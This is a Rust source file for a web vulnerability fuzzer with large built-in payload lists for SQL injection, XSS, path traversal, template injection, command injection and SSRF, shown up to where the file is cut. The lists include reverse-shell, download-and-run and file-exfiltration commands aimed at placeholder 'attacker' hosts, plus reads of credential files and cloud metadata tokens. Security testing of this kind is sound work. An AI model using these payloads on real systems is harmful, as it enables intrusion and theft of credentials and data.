//! Intelligent fuzzer with adaptive payload mutation and anomaly detection.

use grym_core::{Finding, ScopedClient, ScopedClientError, Severity, TechniqueTier};
use std::time::Instant;
use url::Url;

/// Fuzzing strategy selection.
#[derive(Clone, Debug)]
pub enum FuzzStrategy {
    Sequential(Vec<String>),
    Mutation(String),
    Template(String),
    Dictionary,
    Grammar(Vec<Vec<String>>),
}

/// A single fuzz result.
#[derive(Clone, Debug)]
pub struct FuzzResult {
    pub payload: String,
    pub status: u16,
    pub body_length: usize,
    pub response_time_ms: u128,
    pub anomaly_score: f64,
    pub interesting: bool,
}

/// Run a broad fuzzing campaign across all common vulnerability categories.
pub async fn fuzz_all(client: &ScopedClient, url: &Url) -> Result<Vec<Finding>, ScopedClientError> {
    let mut findings = Vec::new();
    let mut detectors: Vec<
        Box<dyn Fn(&str, u16, u128, u16, usize, u128) -> Option<Finding> + Send>,
    > = Vec::new();

    detectors.push(Box::new(
        |payload, baseline_status, baseline_time, status, length, time| {
            let score =
                calculate_anomaly_score(baseline_status, baseline_time, status, length, time);
            if score > 0.75 {
                Some(create_fuzz_finding(
                    "Anomalous response",
                    "potential-injection",
                    payload,
                    score,
                    status,
                    length,
                    time,
                ))
            } else {
                None
            }
        },
    ));

    detectors.push(Box::new(
        |payload, _status, _time, _resp_status, length, _time2| {
            if payload.contains("/etc/passwd")
                || payload.contains("..%2f")
                || payload.contains("C:\\\\\\\\\\\\\\\\windows\\\\\\\\win.ini")
            {
                Some(create_fuzz_finding(
                    "Path traversal payload",
                    "path-traversal",
                    payload,
                    0.8,
                    0,
                    length,
                    0,
                ))
            } else {
                None
            }
        },
    ));

    detectors.push(Box::new(
        |payload, _status, _time, _resp_status, _length, _time2| {
            if payload.contains("<script>")
                || payload.contains("onerror=")
                || payload.contains("javascript:")
            {
                Some(create_fuzz_finding(
                    "XSS payload injected",
                    "xss",
                    payload,
                    0.7,
                    0,
                    0,
                    0,
                ))
            } else {
                None
            }
        },
    ));

    detectors.push(Box::new(
        |payload, _status, _time, _resp_status, _length, _time2| {
            if payload.contains("SLEEP")
                || payload.contains("WAITFOR")
                || payload.contains("pg_sleep")
            {
                Some(create_fuzz_finding(
                    "Time-based injection payload",
                    "sqli",
                    payload,
                    0.85,
                    0,
                    0,
                    0,
                ))
            } else {
                None
            }
        },
    ));

    detectors.push(Box::new(
        |payload, _status, _time, _resp_status, _length, _time2| {
            if payload.contains("<!DOCTYPE")
                || payload.contains("<!ENTITY")
                || payload.contains("XInclude")
            {
                Some(create_fuzz_finding(
                    "XXE payload injected",
                    "xxe",
                    payload,
                    0.75,
                    0,
                    0,
                    0,
                ))
            } else {
                None
            }
        },
    ));

    detectors.push(Box::new(
        |payload, _status, _time, _resp_status, _length, _time2| {
            if payload.contains("$ne") || payload.contains("$where") || payload.contains("$regex") {
                Some(create_fuzz_finding(
                    "NoSQL injection payload",
                    "nosqli",
                    payload,
                    0.75,
                    0,
                    0,
                    0,
                ))
            } else {
                None
            }
        },
    ));

    detectors.push(Box::new(
        |payload, _status, _time, _resp_status, _length, _time2| {
            if payload.contains("__schema")
                || payload.contains("__type")
                || payload.contains("introspection")
            {
                Some(create_fuzz_finding(
                    "GraphQL introspection payload",
                    "graphql",
                    payload,
                    0.7,
                    0,
                    0,
                    0,
                ))
            } else {
                None
            }
        },
    ));

    detectors.push(Box::new(
        |payload, _status, _time, _resp_status, _length, _time2| {
            if payload.contains("__proto__")
                || payload.contains("constructor\":{\"prototype\"")
                || payload.contains("isAdmin\":true")
            {
                Some(create_fuzz_finding(
                    "Prototype / JSON injection payload",
                    "json-injection",
                    payload,
                    0.7,
                    0,
                    0,
                    0,
                ))
            } else {
                None
            }
        },
    ));

    detectors.push(Box::new(
        |payload, _status, _time, _resp_status, _length, _time2| {
            if payload.starts_with("*")
                || payload.contains(")(uid=*")
                || payload.contains("objectClass=")
            {
                Some(create_fuzz_finding(
                    "LDAP injection payload",
                    "ldap-injection",
                    payload,
                    0.7,
                    0,
                    0,
                    0,
                ))
            } else {
                None
            }
        },
    ));

    detectors.push(Box::new(
        |payload, _status, _time, _resp_status, _length, _time2| {
            if payload.contains("{{")
                || payload.contains("${7*7}")
                || payload.contains("<%=")
                || payload.contains("#{7*7}")
                || payload.contains("<#assign")
            {
                Some(create_fuzz_finding(
                    "SSTI payload injected",
                    "ssti",
                    payload,
                    0.75,
                    0,
                    0,
                    0,
                ))
            } else {
                None
            }
        },
    ));

    detectors.push(Box::new(
        |payload, _status, _time, _resp_status, _length, _time2| {
            if payload.starts_with("//")
                || payload.contains("http://")
                || payload.contains("https://")
                || payload.contains("xip.io")
                || payload.contains("nip.io")
                || payload.contains("localtest.me")
                || payload.contains("lvh.me")
                || payload.contains("@evil.com")
            {
                Some(create_fuzz_finding(
                    "SSRF / redirect payload injected",
                    "ssrf",
                    payload,
                    0.7,
                    0,
                    0,
                    0,
                ))
            } else {
                None
            }
        },
    ));

    detectors.push(Box::new(
        |payload, _status, _time, _resp_status, _length, _time2| {
            if payload.contains("%0d%0a")
                || payload.contains("\r\n")
                || payload.contains("X-Forwarded")
                || payload.contains("X-Original-URL")
                || payload.contains("X-Rewrite-URL")
                || payload.contains("Forwarded:")
            {
                Some(create_fuzz_finding(
                    "Header injection / spoofing payload",
                    "header-injection",
                    payload,
                    0.7,
                    0,
                    0,
                    0,
                ))
            } else {
                None
            }
        },
    ));

    let baseline_start = Instant::now();
    let baseline = client
        .get(
            "grym-web-scanner",
            url.clone(),
            TechniqueTier::StandardDetection,
        )
        .await?;
    let baseline_status = baseline.status;
    let _baseline_length = baseline.body.len();
    let baseline_time = baseline_start.elapsed().as_millis() as u128;

    let mut payloads = Vec::new();
    payloads.extend(dictionaries::sqli_wordlist());
    payloads.extend(dictionaries::xss_wordlist());
    payloads.extend(dictionaries::path_traversal_wordlist());
    payloads.extend(dictionaries::ssti_wordlist());
    payloads.extend(dictionaries::cmd_injection_wordlist());
    payloads.extend(dictionaries::ssrf_wordlist());
    payloads.extend(dictionaries::header_wordlist());
    payloads.extend(dictionaries::xxe_wordlist());
    payloads.extend(dictionaries::ldap_wordlist());
    payloads.extend(dictionaries::nosqli_wordlist());
    payloads.extend(dictionaries::graphql_wordlist());
    payloads.extend(dictionaries::json_injection_wordlist());
    payloads.extend(dictionaries::waf_bypass_wordlist());

    for (idx, payload) in payloads.iter().enumerate() {
        if idx % 50 == 0 {
            tokio::time::sleep(std::time::Duration::from_millis(50)).await;
        }
        let mut test_url = url.clone();
        let query = format!("grym_fuzz={}", urlencoding::encode(payload));
        test_url.set_query(Some(&query));

        let start = Instant::now();
        let response = match client
            .get(
                "grym-web-scanner",
                test_url,
                TechniqueTier::StandardDetection,
            )
            .await
        {
            Ok(r) => r,
            Err(_) => continue,
        };
        let response_time = start.elapsed().as_millis() as u128;

        for detector in &detectors {
            if let Some(f) = detector(
                payload,
                baseline_status,
                baseline_time,
                response.status,
                response.body.len(),
                response_time,
            ) {
                findings.push(f);
            }
        }
    }

    findings.sort_by(|a, b| b.severity.cmp(&a.severity));
    findings.dedup_by(|a, b| a.title == b.title && a.remediation == b.remediation);
    Ok(findings)
}

/// Run a targeted fuzzing campaign.
pub async fn fuzz_parameter(
    client: &ScopedClient,
    base_url: &Url,
    _param_name: &str,
    strategy: &FuzzStrategy,
    detectors: &[Box<dyn Fn(&str, &str, u16, usize, u128) -> Option<Finding> + Send>],
) -> Result<Vec<FuzzResult>, ScopedClientError> {
    let payloads = match strategy {
        FuzzStrategy::Sequential(p) => p.clone(),
        FuzzStrategy::Mutation(base) => adaptive_mutation(base, &[]),
        FuzzStrategy::Template(t) => vec![t.replace("{{FUZZ}}", "PAYLOAD")],
        FuzzStrategy::Dictionary => dictionaries::sqli_wordlist(),
        FuzzStrategy::Grammar(parts) => {
            let mut combos = vec![String::new()];
            for part in parts {
                let mut next = Vec::new();
                for prefix in &combos {
                    for choice in part {
                        next.push(format!("{}{}", prefix, choice));
                    }
                }
                combos = next;
            }
            combos
        }
    };

    let baseline_start = Instant::now();
    let baseline = client
        .get(
            "grym-web-scanner",
            base_url.clone(),
            TechniqueTier::StandardDetection,
        )
        .await?;
    let _baseline_body = baseline.body;
    let baseline_time = baseline_start.elapsed().as_millis() as u128;
    let mut results = Vec::new();

    for (idx, payload) in payloads.iter().enumerate() {
        if idx % 50 == 0 {
            tokio::time::sleep(std::time::Duration::from_millis(50)).await;
        }
        let mut test_url = base_url.clone();
        let query = format!("grym_fuzz={}", urlencoding::encode(payload));
        test_url.set_query(Some(&query));

        let start = Instant::now();
        let response = match client
            .get(
                "grym-web-scanner",
                test_url,
                TechniqueTier::StandardDetection,
            )
            .await
        {
            Ok(r) => r,
            Err(_) => continue,
        };
        let response_time = start.elapsed().as_millis() as u128;

        let score = calculate_anomaly_score(
            baseline.status,
            baseline_time,
            response.status,
            response.body.len(),
            response_time,
        );
        let interesting = score > 0.5
            || detectors.iter().any(|d| {
                d(
                    payload,
                    &response.body,
                    response.status,
                    response.body.len(),
                    response_time,
                )
                .is_some()
            });

        results.push(FuzzResult {
            payload: payload.clone(),
            status: response.status,
            body_length: response.body.len(),
            response_time_ms: response_time,
            anomaly_score: score,
            interesting,
        });
    }

    Ok(results)
}

/// Built-in fuzzing dictionaries.
pub mod dictionaries {
    pub fn path_traversal_wordlist() -> Vec<String> {
        let raw = [
            "../",
            "..\\",
            "..%2f",
            "..%5c",
            "%2e%2e%2f",
            "%2e%2e%2fetc%2fpasswd",
            "....//",
            "....\\\\",
            "..%252f",
            "..%252fetc%252fpasswd",
            "%252e%252e%252f",
            "..%c0%af",
            "..%c1%9c",
            "%00../",
            "..\\../..\\../..\\../etc/passwd",
            "C:\\\\windows\\\\win.ini",
            "C:%5cwindows%5cwin.ini",
            "..%2f..%2f..%2fwindows%2fwin.ini",
            "..%2f..%2f..%2f..%2fetc%2fpasswd",
            "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
            "etc/passwd",
            "..%2fetc%2fhosts",
            "..%2f..%2f..%2fvar%2flog%2fapache2%2faccess.log",
            "..%2f..%2f..%2fproc%2fself%2fenviron",
            "..%2f..%2f..%2fproc%2fversion",
            "..%2f..%2f..%2f..%2fhome%2fuser%2f.ssh%2fid_rsa",
            "....//....//....//etc/passwd",
            "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini",
            "\\..\\..\\..\\etc\\passwd",
            "%5c..%5c..%5c..%5cwindows%5cwin.ini",
            "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
            "file:///etc/passwd",
            "file:///C:/windows/win.ini",
            "php://filter/read=convert.base64-encode/resource=/etc/passwd",
            "expect://id",
            "php://input",
            "data://text/plain,<?php phpinfo();?>",
            "../../../../etc/hosts",
            "../../../../etc/hostname",
            "../../../../etc/group",
            "../../../../etc/resolv.conf",
            "../../../../etc/crontab",
            "../../../../etc/ssh/sshd_config",
            "../../../../root/.ssh/id_rsa",
            "../../../../root/.aws/credentials",
            "../../../../home/user/.aws/credentials",
            "../../../../var/www/html/.env",
            "../../../../app/.env",
            "../../../../proc/self/environ",
            "../../../../proc/self/cmdline",
            "../../../../proc/version",
            "../../../../proc/net/tcp",
            "../../../../etc/nginx/nginx.conf",
            "../../../../etc/apache2/apache2.conf",
            "../../../../etc/mysql/my.cnf",
            "../../../../etc/kubernetes/kubelet.conf",
            "../../../../tmp/.dockerenv",
            "../../../../../../var/log/apache2/access.log",
            "../../../../../../var/log/nginx/access.log",
            "../../../../../../var/log/auth.log",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%252f..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%afetc%c0%afpasswd",
            "..%e0%80%af..%e0%80%afetc%2fpasswd",
            "..%u2215..%u2215etc%u2215passwd",
            "..%u2216..%u2216windows%u2216win.ini",
            "....//....//....//....//etc/passwd",
            "../../../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "..\\..\\..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\windows\\system32\\config\\SAM",
            "C:\\inetpub\\wwwroot\\web.config",
            "php://filter/read=convert.base64-encode/resource=../etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/zlib.inflate/resource=/etc/passwd",
            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
            "expect://id",
            "file://localhost/etc/passwd",
            "file:///proc/self/status",
            "file:///C:/boot.ini",
            "file://C:/windows/system32/drivers/etc/hosts",
            "..;/etc/passwd%00",
            "..%00/etc/passwd",
            "../../../../../../proc/self/fd/2",
        ];
        raw.iter().map(|s| s.to_string()).collect()
    }

    pub fn sqli_wordlist() -> Vec<String> {
        let raw = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR '1'='1'/*",
            "') OR ('1'='1",
            "\" OR \"1\"=\"1",
            "1' AND 1=1--",
            "1' AND 1=2--",
            "1' OR 1=1 LIMIT 1--",
            "' UNION SELECT null--",
            "' UNION SELECT null,null--",
            "' UNION SELECT null,null,null--",
            "1' AND SLEEP(5)--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1'; WAITFOR DELAY '0:0:5'--",
            "1'; SELECT pg_sleep(5)--",
            "' AND 1=CONVERT(int,@@version)--",
            "' AND 1=CONVERT(int,(SELECT @@version))--",
            "' OR 1=1 AND 1=1--",
            "' OR 1=1 AND 1=2--",
            "1' AND substring(@@version,1,1)='M'",
            "1' AND IF(1=1,SLEEP(5),0)--",
            "1' AND (SELECT 3521 FROM (SELECT(SLEEP(5)))x)--",
            "' OR 1=1-- -",
            "' OR 1=1;--",
            "admin'--",
            "admin' #",
            "admin'/*",
            "' OR 1=1 AND '1'='1",
            "1' GROUP BY 1--",
            "1' ORDER BY 1--",
            "1' ORDER BY 2--",
            "' UNION SELECT 1,2,3,4,5--",
            "' UNION SELECT 1,username,password FROM users--",
            "1 AND 1=1",
            "1 AND 1=2",
            "1 OR 1=1",
            "1' OR 1--",
            "1'||'1",
            "1' AND 1=1 AND '1'='1",
            "1' RLIKE (SELECT (CASE WHEN (1=1) THEN 1 ELSE 0x28 END))--",
            "1' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--",
            "1' AND updatexml(1,concat(0x7e,(SELECT @@version)),1)--",
            "1' AND 1=CAST((SELECT pg_sleep(5)) AS int)--",
            "1'; BEGIN; SELECT pg_sleep(5); END;--",
            "1' AND (SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT @@version), FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "1%27%20AND%201%3D1--",
            "%27%20OR%20%271%27%3D%271",
            "1%27%20AND%20SLEEP%285%29--",
            "1%bf%27%20or%201%3d1--",
            "%df%27%20or%201%3d1--",
            "admin' OR 1=1--",
            "' OR ''='",
            "' OR 1=1--+",
            "' OR 1=1/*",
            "' OR '1'='1'--",
            "' OR '1'='1'#",
            "' OR 1=1 UNION SELECT 1--",
            "' UNION SELECT 1,2--",
            "' UNION SELECT 1,2,3--",
            "' UNION ALL SELECT NULL,NULL--",
            "' UNION SELECT @@version--",
            "' UNION SELECT version()--",
            "' UNION SELECT user()--",
            "' UNION SELECT database()--",
            "1' AND SLEEP(3)--",
            "1' AND SLEEP(5)#",
            "1' AND pg_sleep(3)--",
            "1'; SELECT pg_sleep(3)--",
            "1' AND WAITFOR DELAY '0:0:3'--",
            "1'; WAITFOR DELAY '0:0:3'--",
            "1' AND BENCHMARK(5000000,MD5(1))--",
            "1' AND 1=IF(1=1,SLEEP(3),0)--",
            "1' AND extractvalue(1,concat(0x7e,version()))--",
            "1' AND updatexml(1,concat(0x7e,version()),1)--",
            "' OR 1=1 INTO OUTFILE '/tmp/x'--",
            "' AND 1=CONVERT(int,(SELECT top 1 name FROM sysobjects))--",
            "' UNION SELECT column_name FROM information_schema.columns--",
            "' UNION SELECT table_name FROM information_schema.tables--",
            "1' ORDER BY 3--",
            "1' ORDER BY 4--",
            "1' ORDER BY 5--",
            "1' ORDER BY 10--",
            "'||(SELECT '||version())||'",
            "'||(SELECT '||user())||'",
            "1' AND 1=2 UNION SELECT 1,2,3--",
            "' OR 1=1 LIMIT 1--",
            "'; DROP TABLE users--",
            "'; EXEC xp_cmdshell('whoami');--",
            "'; EXEC xp_cmdshell('id');--",
            "' AND 1=1 AND 'a'='a",
            "' AND 1=2 AND 'a'='a",
            "1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
            "' AND IF(1=1,1,0)--",
            "' OR IF(1=1,1,0)--",
            "1 AND 1=1 UNION SELECT 1--",
            "1 AND 1=2 UNION SELECT 1--",
            "' OR 'x'='x'--",
            "' OR 'x'='y'--",
            "' AND 'x'='x",
            "' AND 'x'='y",
            "' OR 1=1 HAVING 1=1--",
            "1' OR 1=1#",
            "1' OR 1=1--",
            "1' AND '1'='1",
            "1' AND '1'='2",
            "1%27%20OR%201%3D1--",
            "1%27%20AND%201%3D1--",
            "'%20OR%201%3D1--",
            "1%27%3B%20WAITFOR%20DELAY%20%270%3A0%3A5%27--",
            "%27%20UNION%20SELECT%20NULL--",
            "1' XOR 1--",
            "1' XOR 1=1--",
            "1' XOR 1=2--",
        ];
        raw.iter().map(|s| s.to_string()).collect()
    }

    pub fn xss_wordlist() -> Vec<String> {
        let raw = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<details open ontoggle=alert(1)>",
            "<select onfocus=alert(1) autofocus>",
            "<img src=1 onerror=alert(1)>",
            "<a href=javascript:alert(1)>x</a>",
            "<marquee onstart=alert(1)>",
            "<isindex type=image src=1 onerror=alert(1)>",
            "<script src=//xss.com></script>",
            "<img src=x onerror=confirm(1)>",
            "<svg/onload=prompt(1)>",
            "<img src=x onerror=alert(document.domain)>",
            "<script>alert(document.cookie)</script>",
            "<iframe src=//evil.com>",
            "<object data=javascript:alert(1)>",
            "<embed src=javascript:alert(1)>",
            "<form action=javascript:alert(1)><button>submit</button></form>",
            "<input type=image src=x onerror=alert(1)>",
            "<video src=x onerror=alert(1)>",
            "<audio src=x onerror=alert(1)>",
            "<math href=javascript:alert(1)>CLICK</math>",
            "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
            "<img src=x onerror=top[8680439..toString(30)](1)>",
            "javascript:alert(1)",
            "JaVaScRiPt:alert(1)",
            "<img src=x onerror=alert&#40;1&#41;>",
            "<svg><animate onbegin=alert(1) attributeName=x>",
            "<img src=`x` onerror=alert(1)>",
            "<a href=\"data:text/html,<script>alert(1)</script>\">x</a>",
            "<img src=x onerror=alert(1) onerror=alert(2)>",
            "<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(1)</x:script>",
            "<img src=x onerror=location='javascript:alert(1)'>",
            "<img src=x onerror=window.alert(1)>",
            "<script>alert`1`</script>",
            "<img src=x onerror=alert(String.fromCharCode(49))>",
            "<svg/onload=alert(1)>",
            "<svg onanimationend=alert(1)>",
            "<svg onload=eval(atob('YWxlcnQoMSk='))>",
            "<svg><set attributeName=onload value=alert(1)></svg>",
            "<svg><animateTransform onbegin=alert(1) attributeName=transform></svg>",
            "<math><mtext><script>alert(1)</script></mtext></math>",
            "<math><annotation-xml encoding=text/html><script>alert(1)</script></annotation-xml></math>",
            "<details open ontoggle=alert(1)//<img src=x>",
            "<body onpageshow=alert(1)>",
            "<input autofocus onfocusin=alert(1)>",
            "<textarea autofocus onfocus=alert(1)>",
            "<iframe srcdoc='<script>alert(1)</script>'>",
            "<iframe srcdoc=\"<script>alert(1)</script>\">",
            "<button autofocus onfocus=alert(1)>",
            "<p onclick=alert(1)>x</p>",
            "<p onauxclick=alert(1)>x</p>",
            "<p onpointerdown=alert(1)>x</p>",
            "<div style=\"background:url('javascript:alert(1)')\">",
            "<div style=width:expression(alert(1))>",
            "<style>@import '//evil.com/xss.css';</style>",
            "<a href=\" javascript:alert(1)\">x</a>",
            "<base href=javascript:alert(1)//>",
            "<table background=javascript:alert(1)>",
            "<marquee loop=1 onfinish=alert(1)>",
            "<form method=post action=javascript:alert(1)><input type=submit>",
            "<input type=file onfocus=alert(1) autofocus>",
            "<iframe src=vbscript:msgbox(1)>",
            "{{constructor.constructor('alert(1)')()}}",
            "{{7*7}}",
            "<<script>alert(1)</script>",
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
            "</script><script>alert(1)</script>",
            "<script>prompt(1)</script>",
            "<script>confirm(1)</script>",
            "<script>window['alert'](1)</script>",
            "<script>[].constructor.constructor('alert(1)')()</script>",
            "<script>setTimeout('alert(1)',0)</script>",
            "<script>onerror=alert;throw 1</script>",
            "<img/src=x onerror=alert(1)>",
            "<img%20src=x%20onerror=alert(1)>",
            "<svg/onload=alert(1)//<p>",
            "<svg onload=alert(1)",
            "<img src=x onerror=alert(1)",
            "<details open ontoggle=alert(1)",
            "<body onload=alert(1)",
            "<input autofocus onfocus=alert(1)",
            "<iframe src=javascript:alert(1)",
            "</textarea><script>alert(1)</script>",
            "</title><script>alert(1)</script>",
            "<script>alert(1)//</script>",
            "<script>\\u0061lert(1)</script>",
            "<img src=x onerror=\\u0061lert(1)>",
            "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
            "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
            "<svg><g/onload=alert(1)//<p>",
            "<math><mtext/onload=alert(1)//<p>",
            "<video onerror=alert(1)><source src=x>",
            "<audio onerror=alert(1)><source src=x>",
            "<object onerror=alert(1) data=x>",
            "<embed onerror=alert(1) src=x>",
        ];
        raw.iter().map(|s| s.to_string()).collect()
    }

    pub fn ssti_wordlist() -> Vec<String> {
        let raw = [
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "#{7*7}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "{{[]|attr('__class__')}}",
            "{{_self.env.registerUndefinedVariableCallback('id')}}",
            "{{_self.env.setFilter('eval')}}",
            "{{['id']|filter('system')}}",
            "{{['id']|map('system')|join}}",
            "{% import os %}{{os.system('id')}}",
            "{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval('__import__(\"os\").popen(\"id\").read()') }}{% endif %}{% endfor %}",
            "{{().__class__.__base__.__subclasses__()[177].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}",
            "${T(java.lang.Math).PI}",
            "{{42*42}}",
            "{{'id'.toUpperCase()}}",
            "<#assign ex = 'freemarker.template.utility.Execute'?new()>${ex('id')}",
            "{{1+1}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "<%#  %>",
            "{{2*2}}[[3*3]]",
            "{{8*8}}",
            "#{T(java.lang.Runtime).getRuntime().exec('id')}",
            "{{7*'7'}}",
            "{{request|attr('application')|attr('__globals__')|attr('__builtins__')|attr('__import__')('os')|attr('popen')('id')|attr('read')()}}",
            "{{''.__class__.__mro__[2].__subclasses__()[40]('id').read()}}",
            "{{7**7}}",
            "{{7+7}}",
            "{{'grym'|upper}}",
            "{% if 7*7==49 %}GRYM{% endif %}",
            "{{cycler.__init__.__globals__.os.popen('id').read()}}",
            "{{lipsum.__globals__['os'].popen('id').read()}}",
            "{{namespace.__init__.__globals__.os.popen('id').read()}}",
            "{{range.__init__.__globals__.os.popen('id').read()}}",
            "{{url_for.__globals__['os'].popen('id').read()}}",
            "{{_self.env.registerUndefinedFilterCallback('system')}}",
            "{{'id'|map('system')}}",
            "{{include('/etc/passwd')}}",
            "{{file_get_contents('/etc/passwd')}}",
            "{if 7*7==49}GRYM{/if}",
            "<#assign x=7*7>${x}",
            "<#if 7*7==49>GRYM</#if>",
            "#set($x=7*7)$x",
            "#set($x=$runtime.class.name)$x",
            "${__import__('os').popen('id').read()}",
            "<%= require('child_process').execSync('id').toString() %>",
            "<%= process.mainModule.require('child_process').execSync('id') %>",
            "<%= system('id') %>",
            "<%= `id` %>",
            "<%= ENV['PATH'] %>",
            "@(7*7)",
            "@(DateTime.Now.Year)",
            "${'7'?length}",
            "[[${7*7}]]",
            "[(${7*7})]",
            "{{ 7 | times:7 }}",
            "{{ 'grym' | upcase }}",
            "{% assign x = 7 | times: 7 %}{{ x }}",
            "{{$x := 7}}{{$x}}",
            "<%- 7*7 %>",
            "{{'grym'|reverse}}",
            "{{range.constructor('return process')().mainModule.require('child_process').execSync('id')}}",
        ];
        raw.iter().map(|s| s.to_string()).collect()
    }

    pub fn cmd_injection_wordlist() -> Vec<String> {
        let raw = [
            "; id",
            "| whoami",
            "&& uname -a",
            "|| ls",
            "`id`",
            "$(id)",
            "; whoami;",
            "| whoami |",
            "; cat /etc/passwd",
            "; ping -c 4 127.0.0.1",
            "; sleep 5",
            "; nc -e /bin/sh attacker 4444",
            "& whoami",
            "&& cat /etc/passwd",
            "|| cat /etc/passwd",
            "; echo PWNED",
            "; ls -la",
            "; wget http://attacker.com/shell",
            "; curl http://attacker.com/shell | sh",
            "; python3 -c 'import socket,subprocess,os;...'",
            "; powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=",
            "; echo GRYM_$(id)",
            "; echo GRYM_`id`",
            "; echo GRYM_$USER",
            "; whoami;#",
            "; cat /etc/shadow",
            "; cat /etc/hosts",
            "; cat /etc/group",
            "; hostname",
            "; uname -a",
            "; uname -m",
            "; id; whoami",
            "; pwd",
            "; env",
            "; export",
            "; netstat -an",
            "; ps aux",
            "; ps -ef",
            "; w",
            "; uptime",
            "; date",
            "; free -m",
            "; df -h",
            "; mount",
            "; ls -la /",
            "; find / -name flag* 2>/dev/null",
            "; grep -r password /etc 2>/dev/null",
            "; curl http://attacker.com/shell.sh -o /tmp/s.sh; sh /tmp/s.sh",
            "; wget http://attacker.com/shell.sh -O /tmp/s.sh; /bin/sh /tmp/s.sh",
            "; python3 -c 'import os;os.system(\"id\")'",
            "; python -c 'import os;os.system(\"id\")'",
            "; perl -e 'system(\"id\")'",
            "; ruby -e 'system \"id\"'",
            "; node -e 'require(\"child_process\").execSync(\"id\")'",
            "; php -r 'system(\"id\");'",
            "; bash -c 'id'",
            "; sh -c 'id'",
            "; /bin/bash -c 'cat /etc/passwd'",
            "; nc 127.0.0.1 4444 -e /bin/sh",
            "; openssl s_client -connect attacker.com:443",
            "; mysql -h localhost -u root -e 'select user()'",
            "; redis-cli -h 127.0.0.1 info",
            "; wget --post-file=/etc/passwd http://attacker.com/",
            "; curl -d @/etc/passwd http://attacker.com/",
            "; echo $((1+1))",
            "; whoami && id && uname -a",
            "; cat /etc/passwd | base64",
            "; base64 /etc/passwd",
            "; xxd /etc/passwd",
            "; od -c /etc/passwd",
            "; strings /etc/passwd",
            "|whoami",
            "|id",
            "& id",
            "&& whoami && id",
            "`whoami`",
            "$(whoami)",
            ";;whoami;;",
            "||whoami||",
            "&&whoami&&",
            "|whoami|",
            "%0a whoami",
            "%0d%0a whoami",
            "%09whoami",
            "%26whoami",
            "%3bwhoami",
            "whoami%0a",
            ";whoami%0a",
            "whoami%00",
            "|whoami%00",
            ";whoami%00",
            "whoami$IFSid",
            ";whoami$IFS$9id",
            ";{whoami,}",
            ";{cat,/etc/passwd}",
            ";{ls,-la,/}",
            "$({whoami})",
            ";a=who;b=ami;$a$b",
            ";w'ho'am'i",
            ";w\"ho\"a\"mi\"",
            ";wh${x}oami",
            ";whoami > /tmp/o; cat /tmp/o",
            ";echo a;echo b",
            ";echo $(whoami)",
            ";echo `whoami`",
            ";cd /tmp;ls",
            ";cp /etc/passwd /tmp/p;cat /tmp/p",
        ];
        raw.iter().map(|s| s.to_string()).collect()
    }

    pub fn ssrf_wordlist() -> Vec<String> {
        let raw = [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/metadata/v1.json",
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "http://169.254.169.254/metadata/instance/compute/name?api-version=2021-02-01&format=text",
            "file:///etc/passwd",
            "file:///proc/self/environ",
            "dict://127.0.0.1:6379/info",
            "gopher://127.0.0.1:6379/_INFO",
            "ftp://127.0.0.1/",
            "http://localhost:22/",
            "http://127.0.0.1:8080/",
            "http://0.0.0.0:22/",
            "http://[::]:22/",
            "http://0177.0.0.1/",
            "http://2130706433/",
            "http://0x7f.0.0.1/",
            "http://169.254.169.254.xip.io/",
            "http://0177.1/",
            "http://0x7f000001/",
            "http://[::ffff:169.254.169.254]/",
            "http://127.1/",
            "http://localhost/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/dynamic/instance-identity/document",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "http://metadata.google.internal/computeMetadata/v1/instance/attributes/",
            "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
            "http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/",
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
            "https://kubernetes.default.svc/api/v1/namespaces/default/pods",
            "http://127.0.0.1:2375/containers/json",
